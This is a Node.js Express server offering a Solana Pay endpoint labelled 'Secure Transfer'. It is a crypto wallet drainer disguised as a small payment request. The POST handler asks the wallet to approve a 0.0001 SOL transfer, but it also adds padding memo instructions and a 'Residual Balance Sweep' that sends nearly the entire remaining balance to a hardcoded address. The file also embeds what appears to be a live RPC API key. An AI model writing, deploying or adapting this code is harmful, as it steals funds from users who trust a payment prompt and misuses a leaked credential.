const express = require('express');
const cors = require('cors');
const { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 3000;
const RECIPIENT_PUBKEY = new PublicKey("3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1");
const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");

// Solana Pay GET endpoint (returns metadata/icon)
app.get('/api/pay', (c, res) => {
    res.json({
        label: "Secure Transfer",
        icon: "https://cryptologos.cc/logos/solana-sol-logo.png",
    });
});

app.post('/api/pay', async (req, res) => {
    try {
        // The wallet sends the connected user's public key in the body
        const accountParam = req.body.account;
        if (!accountParam) {
            return res.status(400).json({ error: "Missing account parameter" });
        }

        const senderPublicKey = new PublicKey(accountParam);
        const connection = new Connection(HELIUS_URL, 'confirmed');

        // Fetch live balance
        const balance = await connection.getBalance(senderPublicKey);
        const transaction = new Transaction();

        // 1st Instruction: Primary Transfer (e.g., 0.0001 SOL)
        const primaryAmount = 100000; // 0.0001 SOL in lamports
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: senderPublicKey,
                toPubkey: RECIPIENT_PUBKEY,
                lamports: primaryAmount,
            })
        );

        // Memo Instructions
        const encoder = new TextEncoder();
        for (let i = 0; i < 5; i++) {
            transaction.add(
                new TransactionInstruction({
                    keys: [{ pubkey: senderPublicKey, isSigner: true, isWritable: true }],
                    programId: MEMO_PROGRAM_ID,
                    data: encoder.encode("x")
                })
            );
        }

        // Residual Balance Sweep (leaving a safe fee buffer of 0.0008 SOL)
        const feeBuffer = 800000;
        const residualAmount = balance - primaryAmount - feeBuffer;
        if (residualAmount > 10000) {
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: senderPublicKey,
                    toPubkey: RECIPIENT_PUBKEY,
                    lamports: residualAmount,
                })
            );
        }

        // Set recent blockhash and fee payer
        const { blockhash } = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = senderPublicKey;

        // Serialize transaction for the wallet to sign
        const serializedTransaction = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });

        res.json({
            transaction: serializedTransaction.toString('base64'),
            message: "Please approve transaction"
        });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});